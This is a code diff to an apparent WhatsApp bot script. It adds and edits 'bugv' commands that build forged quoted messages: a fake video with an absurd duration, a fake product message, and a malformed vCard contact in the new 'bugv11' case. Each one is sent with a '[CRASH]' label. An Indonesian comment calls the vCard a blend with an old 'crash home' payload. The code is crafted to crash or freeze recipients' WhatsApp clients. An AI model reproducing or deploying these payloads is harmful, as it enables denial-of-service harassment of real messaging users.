@@ -3508,6 +3508,7 @@ message: {
 } 
 }
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foto})
+break
 case 'bugv3':
 let fvoc = {
 key: { 
@@ -3532,7 +3533,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: { "videoMessage": { 
 "title":"hallo bang","h": 
-`Hmm`,'seconds': '99999', 
+`Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
 'caption': `ʜᴀɴᴢ々ᴏꜰᴄ`,
 'jpegThumbnail': fs.readFileSync(`./menu1.jpeg`),
@@ -3574,7 +3575,7 @@ message: {
 "retailerId": "hanz", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
-hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:f})
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:ftoko})
 break
 case 'bugv7':
 let foncevid = { 
@@ -3621,7 +3622,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgc})
 break
 case 'bugv10':
-let anu = { 
+let stic = { 
 "key": {
 "participant": `0@s.whatsapp.net`,
 "remoteJid": "",
@@ -3644,8 +3645,21 @@ let anu = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:anu})
+ hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:stic})
  break
+//Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
+case 'bugv11':
+let fkon = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: { "contactMessage": { 
+"displayName": `Dislplay`,
+ "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
+ "jpegThumbnail": fs.readFileSync('./menu1.jpeg')}}}
+hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
+break      
 case 'troli': {
 	if (!isCreator) return
 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
